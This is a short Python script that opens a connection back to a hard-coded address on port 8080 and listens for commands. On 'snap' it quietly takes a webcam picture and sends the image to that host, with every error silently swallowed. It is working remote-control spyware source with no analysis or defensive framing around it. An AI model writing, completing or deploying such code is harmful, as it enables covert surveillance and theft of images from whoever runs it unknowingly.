import socket
import cv2

def snap_and_send(s):
    try:
        webcam = cv2.VideoCapture(0)
        check, frame = webcam.read()
        cv2.imwrite(filename="webcam.jpg", img=frame)
        webcam.release()

        #Send the image file data back to the server
        with open('webcam.jpg','rb') as f:
            data = f.read()
            s.sendall(data)
    except:
        pass

def connecting():
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.14',8080))

    while True:
        command = s.recv(1024)

        if'terminate' in command.decode():
            s.close()
            break
        elif'snap' in command.decode():
            try:
                snap_and_send(s)
            except:
                pass

def main():
    connecting()
main()
        





